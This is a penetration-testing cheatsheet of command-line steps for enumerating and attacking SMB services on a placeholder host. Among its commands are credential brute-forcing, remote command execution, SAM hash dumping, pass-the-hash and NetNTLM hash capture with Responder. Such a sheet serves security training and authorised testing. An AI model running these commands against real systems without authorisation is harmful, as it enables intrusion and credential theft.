# SMB Enumeration Cheatsheet
## 1. Enumerate SMB Version and Scripts (nmap)
Gather detailed SMB service information.
```
sudo nmap -sV -sC -p139,445 target.com
```
- `-sV`: Detects service and version.
- `-sC`: Runs default scripts (e.g., `smb2-security-mode`, `smb2-time`).

## 2. Check Anonymous SMB Shares (smbclient)
Test for null session (anonymous) access to list shares.
```
smbclient -N -L //target.com
```
- `-N`: No password (null session).
- `-L`: Lists available shares.

## 3. Enumerate SMB Shares and Permissions (smbmap)
List shares and check permissions.
```
smbmap -H target.com
```
- `-H`: Specify target host.
- Use `-r sharename` to browse a specific share's contents.

## 4. Brute-Force SMB Credentials (crackmapexec)
Attempt SMB password spraying or brute-forcing.
```
crackmapexec smb target.com -u users.txt -p passwords.txt --local-auth
```
- `-u users.txt`: Username wordlist.
- `-p passwords.txt`: Password wordlist.
- `--local-auth`: For non-domain joined systems.

## 5. Enumerate SMB Directory Listing (smbmap)
List files in a share (if readable).
```
smbmap -H target.com -r sharename
```
- `-r sharename`: Browse files in the specified share.

## 6. Download Files from SMB (smbmap)
Retrieve files from an SMB share.
```
smbmap -H target.com --download "sharename\filename"
```
- `--download`: Downloads the specified file.

## 7. Upload Files to SMB (smbmap)
Test write permissions by uploading files.
```
smbmap -H target.com --upload localfile "sharename\filename"
```
- `--upload`: Uploads the specified file.

## 8. Remote Command Execution (crackmapexec)
Execute commands on the target with valid credentials.
```
crackmapexec smb target.com -u username -p password -x 'whoami' --exec-method smbexec
```
- `-x`: Run CMD command.
- `--exec-method smbexec`: Uses SMB-based execution.

## 9. Enumerate Logged-on Users (crackmapexec)
List users currently logged on.
```
crackmapexec smb target.com -u username -p password --loggedon-users
```
- `--loggedon-users`: Enumerates logged-on users.

## 10. Extract SAM Hashes (crackmapexec)
Dump SAM database hashes with admin privileges.
```
crackmapexec smb target.com -u username -p password --sam
```
- `--sam`: Dumps SAM hashes for local accounts.

## 11. Pass-the-Hash (crackmapexec)
Authenticate using NTLM hash instead of password.
```
crackmapexec smb target.com -u username -H ntlmhash
```
- `-H ntlmhash`: Use NTLM hash for authentication.

## 12. Capture NetNTLM Hashes (responder)
Set up a fake SMB server to capture hashes.
```
sudo responder -I interface
```
- `-I interface`: Specify network interface (e.g., eth0).

## Tips
- Use SecLists for `users.txt` and `passwords.txt`.
- Check for misconfigurations (e.g., null sessions, excessive permissions).
- Be cautious with brute-forcing to avoid account lockouts.